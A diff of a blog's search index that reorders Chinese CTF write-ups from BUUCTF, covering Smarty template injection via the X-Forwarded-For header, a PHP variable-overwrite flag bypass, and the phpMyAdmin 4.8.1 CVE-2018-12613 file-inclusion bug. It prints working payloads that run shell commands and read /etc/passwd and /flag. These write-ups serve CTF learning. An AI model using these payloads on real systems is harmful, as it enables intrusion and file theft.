@@ -1,82 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BJDCTF2020 The mystery of ip</title>
-    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
-<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
-<h1 id="解题">解题</h1>
-<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
-<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
-<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
-<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
-<p>发现是 <code>smarty</code>。</p>
-<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
-<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
-<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
-<p>成功get。</p>
-<h1 id="总结">总结</h1>
-<ul>
-<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
-<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BJDCTF2020 Mark loves cat</title>
-    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
-    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
-<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
-<h1 id="解题">解题</h1>
-<p>将源码下载后查看了发现了两个 php 文件。</p>
-<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
-<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
-<p>接下来进行代码审计。</p>
-<blockquote>
-<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
-</blockquote>
-<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
-<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
-<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
-<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
-<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
-<ol type="1">
-<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
-<li><code>$yds=$flag</code></li>
-<li>`<code>$is=$flag</code></li>
-</ol>
-<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
-<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
-<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>git泄露</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BJDCTF20 Cookie is so stable</title>
     <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
     <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
@@ -125,6 +49,82 @@
       </categories>
       <tags>
         <tag>Twig SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020 Mark loves cat</title>
+    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
+    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
+<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
+<h1 id="解题">解题</h1>
+<p>将源码下载后查看了发现了两个 php 文件。</p>
+<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
+<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
+<p>接下来进行代码审计。</p>
+<blockquote>
+<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
+</blockquote>
+<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
+<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
+<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
+<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
+<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
+<ol type="1">
+<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
+<li><code>$yds=$flag</code></li>
+<li>`<code>$is=$flag</code></li>
+</ol>
+<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
+<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
+<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>git泄露</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020 The mystery of ip</title>
+    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
+<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
+<h1 id="解题">解题</h1>
+<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
+<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
+<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
+<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
+<p>发现是 <code>smarty</code>。</p>
+<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
+<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
+<p>成功get。</p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
+<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -248,6 +248,48 @@
         <tag>PHP</tag>
         <tag>RCE</tag>
         <tag>nmap命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GWCTF 2019 我有一个数据库</title>
+    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
+<p>因此，决定扫描目录，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
+<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
+<h1 id="解题">解题</h1>
+<p>通过该页面发现：</p>
+<ol type="1">
+<li><p>phpmyadmin 版本为 4.8.1</p></li>
+<li><p>服务器用的是 apache</p></li>
+<li><p>数据库是 mysql</p></li>
+<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
+<li><p>系统为 Ubuntu</p></li>
+</ol>
+<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
+<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
+<p>得到 flag</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>phpmyadmin 漏洞</tag>
+        <tag>CVE-2018-12613</tag>
       </tags>
   </entry>
   <entry>
@@ -394,48 +436,6 @@
       </tags>
   </entry>
   <entry>
-    <title>GWCTF 2019 我有一个数据库</title>
-    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
-<p>因此，决定扫描目录，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
-<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
-<h1 id="解题">解题</h1>
-<p>通过该页面发现：</p>
-<ol type="1">
-<li><p>phpmyadmin 版本为 4.8.1</p></li>
-<li><p>服务器用的是 apache</p></li>
-<li><p>数据库是 mysql</p></li>
-<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
-<li><p>系统为 Ubuntu</p></li>
-</ol>
